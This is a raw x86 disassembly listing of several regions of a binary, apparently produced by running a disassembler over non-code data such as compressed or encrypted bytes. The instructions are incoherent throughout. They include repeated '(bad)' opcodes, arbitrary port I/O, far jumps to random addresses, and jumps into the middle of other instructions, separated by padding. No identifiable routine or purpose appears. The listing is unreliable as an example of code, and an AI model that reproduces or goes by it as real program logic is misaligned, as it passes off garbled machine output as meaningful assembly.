  420bbf:	mov    BYTE PTR [ecx],ch
  420bc1:	je     0x420bce
  420bc3:	(bad)  
  420bc4:	sbb    DWORD PTR [ebx],ecx
  420bc6:	out    0x86,eax
  420bc8:	jbe    0x420be6
  420bca:	ret    
  420bcb:	sar    DWORD PTR [ecx],0x8a
  420bce:	mov    cl,0x6d
  420bd0:	clc    
  420bd1:	je     0x420c22
  420bd3:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420bd5:	mov    dl,0x32
  420bd7:	out    dx,eax
  420bd8:	stos   BYTE PTR es:[edi],al
  420bd9:	jl     0x420bc3
  420bdb:	mov    ds:0x8fd7c73d,al
  420be0:	in     eax,0xa5
  420be2:	ret    
  420be3:	outs   dx,BYTE PTR ds:[esi]
  420be4:	xchg   BYTE PTR [ebp-0x1cca7e98],cl
  420bea:	cmp    DWORD PTR [ebx+0x51562ed4],edi
  420bf0:	mov    ebp,0x4fa64d30
  420bf5:	loop   0x420bd9
  420bf7:	ds push ebx
  420bf9:	mov    dl,0x60
  420bfb:	call   0x2c2729ae
  420c00:	(bad)  
  420c01:	nop
  420c02:	pop    ecx
  420c03:	or     al,cl
  420c05:	aaa    
  420c06:	int    0xcc
  420c08:	inc    ebx
  420c09:	adc    BYTE PTR [eax-0x1fb0489a],0xb4
  420c10:	fidivr DWORD PTR [edx]
  420c12:	(bad)  
  420c13:	mov    ecx,0x96d96660
  420c18:	xor    BYTE PTR [ecx-0x2570f760],dl
  420c1e:	icebp  
  420c1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c20:	xchg   ecx,eax
  420c21:	stos   BYTE PTR es:[edi],al
  420c22:	imul   ebx,DWORD PTR [eax-0x57],0xffffffb3
  420c26:	mov    DWORD PTR [esi+0x5d16436f],ebx
  420c2c:	(bad)  
  420c2d:	repnz adc BYTE PTR [ecx+eiz*1-0x51865d5],dh
  420c35:	pushf  
  420c36:	sbb    al,0xd7
  420c38:	out    dx,eax
  420c39:	and    BYTE PTR [ebp+eax*8+0x4c],bl
  420c3d:	mov    ecx,0xe828b5
	...
  420cb2:	add    BYTE PTR [eax],al
  420cb4:	or     al,0x6a
  420cb6:	push   edx
  420cb7:	shl    DWORD PTR [esi-0x7],0x9f
  420cbb:	out    dx,eax
  420cbc:	xchg   ecx,eax
  420cbd:	inc    ecx
  420cbe:	push   0xa90c645f
  420cc3:	and    dl,BYTE PTR [edi]
  420cc5:	pop    edi
  420cc6:	add    DWORD PTR [eax],eax
  420cc8:	cmc    
  420cc9:	add    BYTE PTR [eax],al
  420ccb:	add    BYTE PTR [edx+0x79],bh
  420cce:	inc    esi
  420ccf:	pop    ebp
  420cd0:	inc    ecx
  420cd1:	pop    ss
  420cd2:	and    al,0x5b
  420cd4:	or     ah,BYTE PTR ds:0xbeb9233b
  420cda:	(bad)  
  420cdb:	xor    DWORD PTR [ebx-0x7c],ebx
  420cde:	push   esp
  420cdf:	in     al,0x1d
  420ce1:	xor    DWORD PTR [esi-0x69],esi
  420ce4:	xor    BYTE PTR [eax+0x7a73758d],0x78
  420ceb:	bound  ecx,QWORD PTR [edi+ecx*1]
  420cee:	xlat   BYTE PTR ds:[ebx]
  420cef:	test   BYTE PTR [ebp+0x4b],dl
  420cf2:	(bad)  
  420cf3:	adc    eax,0x9223584b
  420cf8:	adc    ah,BYTE PTR [eax-0x704dd3cf]
  420cfe:	out    dx,eax
  420cff:	or     DWORD PTR [eax-0x3d072c60],edi
  420d05:	pushw  ss
  420d07:	mov    ecx,0xe335a269
  420d0c:	leave  
  420d0d:	adc    ah,BYTE PTR [ecx]
  420d0f:	mov    es,WORD PTR [ebx-0x78]
  420d12:	xor    esp,edx
  420d14:	cmc    
  420d15:	mov    es,WORD PTR [ebx]
  420d17:	out    dx,al
  420d18:	aas    
  420d19:	int3   
  420d1a:	les    ebp,FWORD PTR [ecx-0x6b]
  420d1d:	cmp    DWORD PTR [edx],edx
  420d1f:	out    0xff,eax
  420d21:	mov    ebx,esp
  420d23:	dec    edx
  420d24:	mov    eax,0x4e7eb52e
  420d29:	mov    ah,0xd4
  420d2b:	xor    dh,BYTE PTR [edi-0x5f10c727]
  420d31:	mul    DWORD PTR [ecx-0x60]
  420d34:	jb     0x420cd9
  420d36:	es sti 
  420d38:	out    dx,al
  420d39:	xchg   ebx,eax
  420d3a:	adc    bh,BYTE PTR [ebx-0x48]
  420d3d:	push   ecx
  420d3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d3f:	sub    BYTE PTR [esi+0x1b],ch
  420d42:	loopne 0x420d48
  420d44:	cmc    
  420d45:	stos   DWORD PTR es:[edi],eax
  420d46:	pusha  
  420d47:	sub    BYTE PTR [ebp-0x53],dl
  420d4a:	daa    
  420d4b:	iret   
  420d4c:	xchg   edi,eax
  420d4d:	dec    esp
  420d4e:	cmp    al,0x36
  420d50:	stos   DWORD PTR es:[edi],eax
  420d51:	mov    DWORD PTR [edx],esp
  420d53:	popa   
  420d54:	pop    ecx
  420d55:	xchg   ebx,eax
  420d56:	sub    al,0xae
  420d58:	iret   
  420d59:	pusha  
  420d5a:	mov    ebx,0xb5434b18
  420d5f:	aas    
  420d60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d61:	add    bh,dl
  420d63:	test   BYTE PTR [ebx],0x45
  420d66:	sbb    eax,0x8fdef62a
  420d6b:	sub    al,0x37
  420d6d:	sbb    bl,al
  420d6f:	sti    
  420d70:	aaa    
  420d71:	jl     0x420d0c
  420d73:	retf   0x191f
  420d76:	sbb    edi,DWORD PTR [ebp+0x9374f10]
  420d7c:	cld    
  420d7d:	cwde   
  420d7e:	dec    ebx
  420d7f:	pop    ss
  420d80:	mov    eax,ds:0xa0c4b08b
  420d85:	shr    cl,0x75
  420d88:	pop    esp
  420d89:	es jo  0x420dba
  420d8c:	jne    0x420d19
  420d8e:	jo     0x420d8b
  420d90:	iret   
  420d91:	fwait
  420d92:	in     eax,0x13
  420d94:	adc    ebx,ebp
  420d96:	dec    eax
  420d97:	add    dl,BYTE PTR [ecx]
  420d99:	mov    al,ss:0x5855dce5
  420d9f:	sbb    ecx,DWORD PTR [edx-0x7273fa0a]
  420da5:	into   
  420da6:	xchg   esp,eax
  420da7:	jns    0x420d92
  420da9:	ds mov edi,0x230b465a
  420daf:	enter  0xb02c,0x7c
  420db3:	sbb    al,0x6c
  420db5:	jge    0x420de9
  420db7:	push   eax
  420db8:	bound  esp,QWORD PTR [ecx-0x40]
  420dbb:	inc    ebx
  420dbc:	retf   0xd375
  420dbf:	fs out dx,al
	...
  420e31:	add    BYTE PTR [eax],al
  420e33:	add    BYTE PTR [edx-0x1865ab],ch
  420e39:	out    dx,eax
  420e3a:	call   FWORD PTR [ebp+0x64]
  420e3d:	inc    ebx
  420e3e:	and    edx,ecx
  420e40:	call   DWORD PTR [edx]
  420e42:	and    bl,BYTE PTR ds:0x1600c
  420e48:	cmc    
  420e49:	add    BYTE PTR [eax],al
  420e4b:	add    BYTE PTR [edx-0x4d],ah
  420e4e:	dec    ebx
  420e4f:	xchg   esi,eax
  420e50:	out    dx,al
  420e51:	retf   0x8150
  420e54:	into   
  420e55:	icebp  
  420e56:	shl    DWORD PTR [esp+ebx*4-0x2cd2aeb6],1
  420e5d:	mov    ds,WORD PTR [esi]
  420e5f:	push   esp
  420e60:	xchg   DWORD PTR [edx-0x2c],ebp
  420e63:	(bad)  
  420e64:	nop
  420e65:	and    si,WORD PTR [eax-0x31c510d5]
  420e6c:	and    BYTE PTR [ebp-0x245d612c],al
  420e72:	sub    eax,DWORD PTR [ebp-0x6d6f0c95]
  420e78:	dec    edi
  420e79:	cmp    al,BYTE PTR [eax]
  420e7b:	out    dx,eax
  420e7c:	leave  
  420e7d:	mov    al,0x92
  420e7f:	lods   eax,DWORD PTR ds:[esi]
  420e80:	xor    cl,BYTE PTR [ebx+0xbefc78]
  420e86:	xchg   DWORD PTR [edx-0x1d],edx
  420e89:	adc    al,0x9f
  420e8b:	fstp   TBYTE PTR [eax-0x5a7d39c5]
  420e91:	inc    eax
  420e92:	jp     0x420ec6
  420e94:	and    eax,ecx
  420e96:	nop
  420e97:	pop    ecx
  420e98:	xor    al,BYTE PTR [edi+ebp*8]
  420e9b:	cld    
  420e9c:	pop    esp
  420e9d:	or     al,0x47
  420e9f:	pop    esi
  420ea0:	test   eax,0x55f2a261
  420ea5:	or     eax,0x8eb73046
  420eaa:	out    0x7e,eax
  420eac:	add    BYTE PTR [ebp-0x57f0da5],ch
  420eb2:	inc    esi
  420eb3:	ss xor dl,dh
  420eb6:	cmc    
  420eb7:	adc    eax,0x1f65badd
  420ebc:	or     bl,ch
  420ebe:	fcom   st(1)
  420ec0:	je     0x420ebb
  420ec2:	xchg   ebx,eax
  420ec3:	imul   esi,DWORD PTR [ebx+0x699a52a2],0xff2ada22
  420ecd:	sbb    eax,DWORD PTR [edi+0x60b87493]
  420ed3:	xchg   esp,eax
  420ed4:	cmp    eax,0x49d43bb8
  420ed9:	push   edi
  420eda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420edb:	xor    BYTE PTR [ebx],0xab
  420ede:	jo     0x420eeb
  420ee0:	dec    esp
  420ee1:	xchg   ecx,eax
  420ee2:	mov    eax,ds:0x82ad833
  420ee7:	sub    cl,BYTE PTR [ebx+0x34e9f50c]
  420eed:	xchg   edx,eax
  420eee:	fadd   st,st(5)
  420ef0:	jmp    0xc8b3:0x28b51144
  420ef7:	xchg   edx,eax
  420ef8:	mov    DWORD PTR [eax],edx
  420efa:	mov    ah,0x8f
  420efc:	sub    bh,BYTE PTR [ecx]
  420efe:	aaa    
  420eff:	mov    ds:0xbad0123,eax
  420f04:	add    bl,BYTE PTR [ecx+esi*2-0x70]
  420f08:	ja     0x420ec6
  420f0a:	add    edx,DWORD PTR [edi-0x33]
  420f0d:	mov    al,bh
  420f0f:	mov    ds:0x4245c08,eax
  420f14:	jmp    0xd8e7de1b
  420f19:	lods   al,BYTE PTR ds:[esi]
  420f1a:	cmc    
  420f1b:	mov    ebp,0x7ea2a958
  420f20:	inc    ebp
  420f21:	outs   dx,DWORD PTR ds:[esi]
  420f22:	out    dx,al
  420f23:	repz leave 
  420f25:	add    al,ah
  420f27:	and    esp,DWORD PTR [ebx+0x30e18c3d]
  420f2d:	sti    
  420f2e:	mov    BYTE PTR [ebx+0x44c61f56],al
  420f34:	iret   
  420f35:	pop    DWORD PTR [ebp+0x17]
  420f38:	bound  ebp,QWORD PTR [esi+0x7ada648f]
  420f3e:	sbb    BYTE PTR [esi+0x21],dl
	...
  420fb1:	add    BYTE PTR [eax],al
  420fb3:	add    BYTE PTR [edx-0x5b],ah
  420fb6:	jbe    0x421037
  420fb8:	idiv   edi
  420fba:	imul   edi,DWORD PTR [ebp-0x6d53d0f4],0xffffff86
  420fc1:	data16 loope 0x420f9b
  420fc4:	add    DWORD PTR [ecx+0x1],esp
  420fc7:	add    ch,dh
  420fc9:	add    BYTE PTR [eax],al
  420fcb:	add    BYTE PTR [edx-0x7dabdfbc],dl
  420fd1:	pop    eax
  420fd2:	adc    DWORD PTR [eax-0x5da23e54],edi
  420fd8:	test   DWORD PTR [edi+edi*2+0x1e],0xea1e791e
  420fe0:	ror    DWORD PTR [ecx-0x57],cl
  420fe3:	and    DWORD PTR [edi],esi
  420fe5:	and    dh,BYTE PTR [edi]
  420fe7:	sbb    ebp,DWORD PTR [edi+0x40313ce8]
  420fed:	fstp   st(5)
  420fef:	sub    BYTE PTR [ebx+ebp*8+0x70],cl
  420ff3:	or     cl,BYTE PTR [ebx-0xaf2ec4e]
  420ff9:	retf   
  420ffa:	imul   DWORD PTR [ebx-0x76f71af0]
  421000:	in     al,dx
  421001:	(bad)  
  421002:	sub    al,0xab
  421004:	mov    ah,BYTE PTR [edi]
  421006:	dec    esp
  421007:	(bad)  
  421008:	pop    ebx
  421009:	dec    edi
  42100a:	aad    0x42
  42100c:	into   
  42100d:	enter  0x337,0x9a
  421011:	pop    esi
  421012:	xor    BYTE PTR [eax],0x2c
  421015:	ss jne 0x421073
  421018:	add    ebp,ecx
  42101a:	ret    
  42101b:	mov    dh,0x6f
  42101d:	mov    esi,DWORD PTR [ecx-0x4e17029d]
  421023:	inc    eax
  421024:	xchg   edi,eax
  421025:	pop    es
  421026:	cmp    al,BYTE PTR [edx+0x416f70f8]
  42102c:	call   FWORD PTR [edi]
  42102e:	mov    esp,0xed84f1f4
  421033:	jge    0x421045
  421035:	ja     0x4210a9
  421037:	les    esp,FWORD PTR [edx]
  421039:	cmp    eax,0x2140a997
  42103e:	call   0x50ab691f
  421043:	jecxz  0x420fca
  421045:	fsubr  DWORD PTR [edx+0x21]
  421048:	mov    ds:0x1c3be0e7,eax
  42104d:	and    ecx,DWORD PTR [ebx]
  42104f:	hlt    
  421050:	and    DWORD PTR [ebx-0x5381560a],edi
  421056:	push   0xffffff97
  421058:	test   DWORD PTR [ebx-0x20],0x7e74b1ff
  42105f:	retf   
  421060:	and    DWORD PTR [esi+0x3c47693d],ebx
  421066:	xchg   ebp,eax
  421067:	fwait
  421068:	mov    cl,0x60
  42106a:	mov    edi,0x338846a9
  42106f:	xchg   ecx,eax
  421070:	push   ds
  421071:	out    dx,al
  421072:	out    0x8a,al
  421074:	fidiv  DWORD PTR [esi+0x35a104b4]
  42107a:	in     eax,dx
  42107b:	lahf   
  42107c:	jbe    0x421039
  42107e:	fild   WORD PTR [ebx-0x7671250b]
  421084:	push   edx
  421085:	sub    ah,BYTE PTR [ebx+0x60]
  421088:	(bad)  
  421089:	xchg   edx,eax
  42108a:	lea    ecx,[esi-0x5536e5fa]
  421090:	jae    0x42110c
  421092:	jae    0x421096
  421094:	shl    BYTE PTR [edx],cl
  421096:	fs out dx,eax
  421098:	dec    edx
  421099:	mov    ebp,0x6d5632a
  42109e:	adc    eax,esp
  4210a0:	pop    ss
  4210a1:	popa   
  4210a2:	pop    eax
  4210a3:	enter  0x44b,0xbf
  4210a7:	mov    esp,0x1b6889bb
  4210ac:	sar    BYTE PTR [ebx-0x5d782630],0x8
  4210b3:	xchg   ecx,eax
  4210b4:	out    0x99,eax
  4210b6:	ds sti 
  4210b8:	in     al,dx
  4210b9:	sbb    al,0x82
  4210bb:	dec    edi
  4210bc:	xchg   ebp,eax
  4210bd:	aas    
  4210be:	sbb    ch,bl
  4210c0:	mov    ds:0x0,al
	...
  421131:	add    BYTE PTR [eax],al
  421133:	add    BYTE PTR [ebx-0x31],dh
  421136:	fwait
  421137:	cmp    DWORD PTR [edi+0x15cff37d],edi
  42113d:	dec    edi
  42113e:	data16 jg 0x4211b0
  421141:	mov    ebp,0x61f674c4
  421146:	add    DWORD PTR [eax],eax
  421148:	cmc    
  421149:	add    BYTE PTR [eax],al
  42114b:	add    BYTE PTR [ebx+0x31],cl
  42114e:	xchg   esi,eax
  42114f:	or     al,0x3
  421151:	std    
  421152:	adc    eax,DWORD PTR [edx]
  421154:	out    0x12,eax
  421156:	shl    BYTE PTR es:[esi+0x6ff007a9],1
  42115d:	popa   
  42115e:	jmp    0x42110b
  421160:	rol    DWORD PTR [edx],cl
  421162:	ins    DWORD PTR es:[edi],dx
  421163:	sub    eax,0x34eac3ce
  421168:	int    0xfd
  42116a:	(bad)  
  42116b:	lds    eax,FWORD PTR [edx]
  42116d:	mov    dh,dl
  42116f:	in     eax,0x77
  421171:	add    eax,0xffffffa2
  421174:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421175:	outs   dx,DWORD PTR ds:[esi]
  421176:	cmp    WORD PTR ss:[ecx-0x36be5e09],cx
  42117e:	xor    dl,BYTE PTR [edx+0x625ed670]
  421184:	dec    ebp
  421185:	push   ecx
  421186:	out    0xb5,eax
  421188:	pop    ss
  421189:	in     al,0x94
  42118b:	xchg   ebx,eax
  42118c:	mov    cl,0xbe
  42118e:	std    
  42118f:	dec    esi
  421190:	add    eax,0xbc69e17a
  421195:	sbb    DWORD PTR [edx+0x6c3b37e6],edx
  42119b:	stos   DWORD PTR es:[edi],eax
  42119c:	int3   
  42119d:	jae    0x42113a
  42119f:	adc    eax,DWORD PTR ss:[edi-0x2c]
  4211a3:	ret    0x3fef
  4211a6:	jmp    0xafeed83e
  4211ab:	push   es
  4211ac:	dec    ebp
  4211ad:	mov    dh,dh
  4211af:	jno    0x4211d4
  4211b1:	outs   dx,BYTE PTR ds:[esi]
  4211b2:	jnp    0x42115a
  4211b4:	js     0x421207
  4211b6:	repnz ss popa 
  4211b9:	jle    0x4211ed
  4211bb:	adc    edx,DWORD PTR [ebx+0x65]
  4211be:	lods   eax,DWORD PTR ds:[esi]
  4211bf:	lahf   
  4211c0:	ds ins DWORD PTR es:[edi],dx
  4211c2:	loopne 0x421158
  4211c4:	push   ds
  4211c5:	popa   
  4211c6:	in     al,0x5
  4211c8:	cmc    
  4211c9:	and    bl,BYTE PTR [ebx]
  4211cb:	xchg   edi,eax
  4211cc:	cmp    esi,DWORD PTR [ebx-0x6568596c]
  4211d2:	imul   ebp,DWORD PTR [eax-0x48],0x36a51fb2
  4211d9:	mov    ch,0xcc
  4211db:	jno    0x421216
  4211dd:	fst    DWORD PTR ds:[esi]
  4211e0:	mov    edi,0x2e48cf12
  4211e5:	jmp    0x421217
  4211e7:	inc    edi
  4211e8:	inc    eax
  4211e9:	sti    
  4211ea:	(bad)  
  4211eb:	and    edx,DWORD PTR [ecx+0x1e0390f6]
  4211f1:	adc    DWORD PTR ds:0xd7334630,ebp
  4211f7:	mov    BYTE PTR [edi-0x5952cfd9],dl
  4211fd:	push   ebx
  4211fe:	dec    esi
  4211ff:	inc    ecx
  421200:	iret   
  421201:	mov    al,ds:0xf1d89865
  421206:	(bad)  
  421207:	push   0xffffffd5
  421209:	dec    ecx
  42120a:	fucomi st,st(7)
  42120c:	popa   
  42120d:	test   eax,0xe7553cb7
  421212:	push   eax
  421213:	test   bl,ah
  421215:	xor    al,0xd9
  421217:	or     al,0x81
  421219:	inc    esp
  42121a:	or     eax,0x8914ce67
  42121f:	in     al,0xf5
  421221:	(bad)  
  421222:	sbb    ebx,esi
  421224:	les    eax,FWORD PTR [ebx+0x4a945f03]
  42122a:	lahf   
  42122b:	jae    0x4211eb
  42122d:	inc    ebx
  42122e:	adc    BYTE PTR [edx+0x4cb9376b],bh
  421234:	xchg   ecx,eax
  421236:	scas   eax,DWORD PTR es:[edi]
  421237:	jg     0x421275
  421239:	add    ecx,DWORD PTR [ecx+0x30af45ed]
  42123f:	mov    ecx,0x3c
	...
  4212b4:	inc    ecx
  4212b5:	push   es
  4212b6:	clc    
  4212b7:	mov    esi,0xff47feff
  4212bc:	or     eax,0x5c83dc15
  4212c1:	cli    
  4212c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212c3:	adc    al,0xeb
  4212c5:	bound  eax,QWORD PTR [ecx]
  4212c7:	add    ch,dh
  4212c9:	add    BYTE PTR [eax],al
  4212cb:	add    BYTE PTR [ebx-0x2471642c],al
  4212d1:	sub    esp,ecx
  4212d3:	ja     0x42134f
  4212d5:	pushf  
  4212d6:	mov    ch,0x2
  4212d8:	xor    al,0xa2
  4212da:	sub    edx,0x77effb0a
  4212e0:	add    BYTE PTR [ecx],dl
  4212e2:	call   0x116d:0xae827ba0
  4212e9:	xor    ebx,DWORD PTR [ecx]
  4212eb:	mov    dl,0xd4
  4212ed:	aam    0x1d
  4212ef:	(bad)  
  4212f0:	mov    BYTE PTR [ebx-0xf10b628],ah
  4212f6:	mov    ebx,0xd6ad4039
  4212fb:	jnp    0x4212bd
  4212fd:	xchg   BYTE PTR [ebx-0x39],dh
  421300:	and    cl,dh
  421302:	test   DWORD PTR [ebx],esi
  421304:	adc    DWORD PTR ds:0xdc7593c,edx
  42130a:	or     dl,BYTE PTR [edi+0x30]
  42130d:	hlt    
  42130e:	mov    ch,0x87
  421310:	aaa    
  421311:	jbe    0x421359
  421313:	and    DWORD PTR [edi-0x5be9f7e5],esi
  421319:	dec    ebp
  42131a:	sbb    BYTE PTR [esi+0x7906f63e],bl
  421320:	in     al,0x85
  421322:	push   eax
  421323:	mov    bh,0xa1
  421325:	(bad)  
  421326:	sub    edx,DWORD PTR [ebx-0x1]
  421329:	(bad)  
  42132a:	into   
  42132b:	add    bl,BYTE PTR [ecx-0x22ef9325]
  421331:	std    
  421332:	ja     0x421319
  421334:	adc    DWORD PTR [ecx+0x7a],edx
  421337:	pop    edx
  421338:	sub    bh,BYTE PTR [ebp-0x3e]
  42133b:	pop    ecx
  42133c:	jo     0x4212dc
  42133e:	les    eax,FWORD PTR ds:0xbe07c522
  421344:	xchg   BYTE PTR [edi],al
  421346:	pushf  
  421347:	inc    esi
  421348:	into   
  421349:	mov    al,ds:0x3c2d63af
  42134e:	and    DWORD PTR [eax+0x7f],0x1
  421352:	push   edi
  421353:	sbb    DWORD PTR [esi-0x42],eax
  421356:	(bad)  
  421357:	test   al,0xe6
  421359:	lock pop edx
  42135b:	loopne 0x421322
  42135d:	(bad)  
  42135e:	sahf   
  42135f:	(bad)  
  421360:	or     al,0x34
  421362:	xor    eax,0xffffffcf
  421365:	cmp    al,0x96
  421367:	or     ch,BYTE PTR [esi]
  421369:	ret    0x8862
  42136c:	mov    dh,0x58
  42136e:	mov    bh,0xd6
  421370:	enter  0xb3f4,0xe8
  421374:	jnp    0x4213df
  421376:	inc    esp
  421377:	stos   DWORD PTR es:[edi],eax
  421378:	lock jecxz 0x421341
  42137b:	(bad)  
  42137c:	mov    ebp,0xa0804c5a
  421381:	movzx  edx,BYTE PTR [edi-0xcfea1fa]
  421388:	jb     0x421384
  42138a:	sbb    dh,bh
  42138c:	gs addr16 jno 0x421377
  421390:	fadd   st(0),st
  421392:	test   al,al
  421394:	sub    eax,0x9343b846
  421399:	xchg   edx,eax
  42139a:	lea    esp,[edx]
  42139c:	add    eax,0x58c3cbbd
  4213a1:	aad    0x28
  4213a3:	adc    ebx,0xffffffc2
  4213a6:	cdq    
  4213a7:	fnstsw WORD PTR [edx+0x1]
  4213aa:	push   edx
  4213ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4213ac:	xchg   edi,eax
  4213ad:	rcl    DWORD PTR [edi+ecx*4],cl
  4213b0:	inc    ebp
  4213b1:	repnz test al,0x86
  4213b4:	push   edx
  4213b5:	jmp    0x475d:0x1f9a2f1d
  4213bc:	in     eax,dx
  4213bd:	mov    ch,0xe6
  4213bf:	dec    edi
  4213c0:	scas   al,BYTE PTR es:[edi]
	...
  421431:	add    BYTE PTR [eax],al
  421433:	add    BYTE PTR [esi+0x7f125794],ch
  421439:	shr    edi,cl
  42143b:	mov    esp,0x960320e2
  421440:	and    ah,dl
  421442:	pop    ds
  421443:	push   0x163e0
  421448:	cmc    
  421449:	add    BYTE PTR [eax],al
  42144b:	add    dh,dh
  42144d:	fsub   st,st(7)
  42144f:	sbb    bh,BYTE PTR [ecx+0x11]
  421452:	js     0x421428
  421454:	int3   
  421455:	inc    ebx
  421456:	das    
  421457:	(bad)  [ebx+0x593f8bc3]
  42145d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42145e:	jp     0x42145e
  421460:	bnd jle 0x42149a
  421463:	(bad)  
  421464:	mov    eax,0x7b9857f6
  421469:	or     eax,0xf1cc3542
  42146e:	(bad)  
  421470:	cmp    DWORD PTR [edi],edx
  421472:	in     al,0x2f
  421474:	mov    bl,0xc0
  421476:	js     0x421499
  421478:	inc    edi
  421479:	cmp    eax,0x3c48d61d
  42147e:	repnz int3 
  421480:	das    
  421481:	lock jmp 0x42147d
  421484:	leave  
  421485:	add    al,0xbb
  421487:	addr16 inc esp
  421489:	xor    BYTE PTR [ecx],dl
  42148b:	cdq    
  42148c:	ss and al,0x2
  42148f:	sub    al,0x9d
  421491:	mov    edi,0x7d9042c0
  421496:	push   edi
  421497:	xor    DWORD PTR ds:0x10cb41c7,0xfcfded3
  4214a1:	xchg   esp,eax
  4214a2:	ins    DWORD PTR es:[edi],dx
  4214a3:	jbe    0x4214af
  4214a5:	ds imul edx,edx,0xb8c53ee4
  4214ac:	mov    dh,BYTE PTR [ebp-0x60]
  4214af:	jg     0x421493
  4214b1:	rcl    DWORD PTR [ecx],cl
  4214b3:	adc    eax,0x4a67d1e3
  4214b8:	fisubr WORD PTR [edi]
  4214ba:	addr16 pop ds
  4214bc:	dec    ebx
  4214bd:	or     DWORD PTR [eax],0xfde8ab33
  4214c3:	push   edx
  4214c4:	xchg   esi,eax
  4214c5:	push   es
  4214c6:	jbe    0x4214c8
  4214c8:	stos   BYTE PTR es:[edi],al
  4214c9:	test   ecx,ecx
  4214cb:	sbb    esi,DWORD PTR [edx-0x3d9ce620]
  4214d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4214d2:	dec    edi
  4214d3:	(bad)  
  4214d4:	cmc    
  4214d5:	dec    edi
  4214d6:	jae    0x421508
  4214d8:	addr16 jo 0x421541
  4214db:	inc    esp
  4214dc:	(bad)  
  4214dd:	mov    esp,0x62c3e056
  4214e2:	ret    0x4f4b
  4214e5:	js     0x4214a3
  4214e7:	pop    es
  4214e8:	lahf   
  4214e9:	push   ds
  4214ea:	adc    al,0xec
  4214ec:	jae    0x421522
  4214ee:	loopne 0x42155d
  4214f0:	sub    BYTE PTR [edx+edx*1-0x21c115f4],bl
  4214f7:	punpcklwd mm5,DWORD PTR [edx+0x5910833d]
  4214fe:	mov    ds:0xe466f57c,al
  421503:	add    DWORD PTR [ebx-0x2636789],edi
  421509:	retf   0xd780
  42150c:	or     edi,DWORD PTR [esi+0x599e83a9]
  421512:	cs add al,0xf5
  421515:	int    0x61
  421517:	std    
  421518:	jl     0x4214cf
  42151a:	cmp    DWORD PTR [edi-0x3f0acdc3],edi
  421520:	repz div BYTE PTR ds:0xaa1c6da3
  421527:	mov    bh,0x60
  421529:	imul   esp,DWORD PTR [edi+esi*1],0xfffffff0
  42152d:	fcom   st(0)
  42152f:	bound  ecx,QWORD PTR [eax]
  421531:	push   edi
  421532:	repz retf 
  421534:	enter  0x5e2b,0x34
  421538:	mov    BYTE PTR [eax+0x6e5e9078],dl
  42153e:	mov    eax,ds:0x553b
	...
  4215b3:	add    BYTE PTR [eax+ebp*2-0x2703f748],al
  4215ba:	mov    ah,0xec
  4215bc:	int3   
  4215bd:	ror    BYTE PTR [edx+ebp*4],cl
  4215c0:	push   esp
  4215c1:	jno    0x421589
  4215c3:	outs   dx,BYTE PTR ds:[esi]
  4215c4:	aad    0x64
  4215c6:	add    DWORD PTR [eax],eax
  4215c8:	cmc    
  4215c9:	add    BYTE PTR [eax],al
  4215cb:	add    BYTE PTR ds:0x365bbfef,ch
  4215d1:	dec    esp
  4215d2:	mov    bl,0x6f
  4215d4:	xchg   ecx,eax
  4215d5:	mov    fs,WORD PTR [edi-0x1]
  4215d8:	clc    
  4215d9:	scas   al,BYTE PTR es:[edi]
  4215da:	and    eax,0xd071b4b5
  4215df:	cmp    eax,DWORD PTR ds:0x947fc036
  4215e5:	dec    ebx
  4215e6:	ret    
  4215e7:	ret    0xe99
  4215ea:	mov    BYTE PTR [edi-0x8],bh
  4215ed:	(bad)  
  4215ee:	pusha  
  4215ef:	cmp    BYTE PTR [esi+0x61],bh
  4215f2:	stc    
  4215f3:	js     0x4215ee
  4215f5:	mov    al,0x32
  4215f7:	cmova  esi,DWORD PTR [ebx+ecx*1]
  4215fb:	stos   DWORD PTR es:[edi],eax
  4215fc:	fst    st(4)
  4215fe:	xchg   ecx,eax
  4215ff:	sti    
  421600:	cmc    
  421601:	adc    ch,BYTE PTR [ecx+0x12fee561]
  421607:	xchg   ebx,eax
  421608:	ret    
  421609:	ficomp DWORD PTR [ebx+0x410fa97d]
  42160f:	rol    DWORD PTR [ebx-0x4fbdd008],cl
  421615:	pop    es
  421616:	push   cs
  421617:	cmp    ah,ch
  421619:	jo     0x42167c
  42161b:	mov    bl,BYTE PTR [ebx]
  42161d:	loop   0x42163c
  42161f:	add    eax,DWORD PTR [ecx-0x1e]
  421622:	push   ss
  421623:	iret   
  421624:	test   DWORD PTR [eax+0x6f066ac7],edx
  42162a:	stos   DWORD PTR es:[edi],eax
  42162b:	push   esi
  42162c:	(bad)  
  42162d:	stos   BYTE PTR es:[edi],al
  42162e:	sbb    al,0x9
  421630:	push   ebp
  421631:	lock jo 0x421652
  421634:	xadd   ch,bl
  421637:	pop    edi
  421638:	jl     0x42160a
  42163a:	enter  0x3466,0x2a
  42163e:	mov    BYTE PTR [ebp+esi*2-0x4b],al
  421642:	adc    eax,DWORD PTR [ebp-0x5c7a473b]
  421648:	adc    bl,bh
  42164a:	add    ecx,DWORD PTR ds:0x2d8e0195
  421650:	mov    dl,0x2a
  421652:	lahf   
  421653:	xchg   ax,ax
  421655:	cmp    DWORD PTR [ebp+0x46a8336c],esi
  42165b:	in     eax,0xd4
  42165d:	aas    
  42165e:	ret    0x6c4b
  421661:	inc    esi
  421662:	mov    edx,0x54f25a9e
  421667:	div    edi
  421669:	push   es
  42166a:	jl     0x421637
  42166c:	shl    ecx,cl
  42166e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42166f:	call   0x9382df79
  421674:	int3   
  421675:	and    cl,BYTE PTR [ecx-0x69941288]
  42167b:	(bad)  
  42167c:	imul   edx,DWORD PTR [ebx-0x55725875],0x36
  421683:	pop    ds
  421684:	cmp    eax,0xa169dad0
  421689:	in     eax,0x97
  42168b:	scas   al,BYTE PTR es:[edi]
  42168c:	and    eax,0x52856e24
  421691:	and    al,bh
  421693:	aam    0xae
  421695:	scas   eax,DWORD PTR es:[edi]
  421696:	ja     0x4216e0
  421698:	sbb    BYTE PTR [edi-0x64],ch
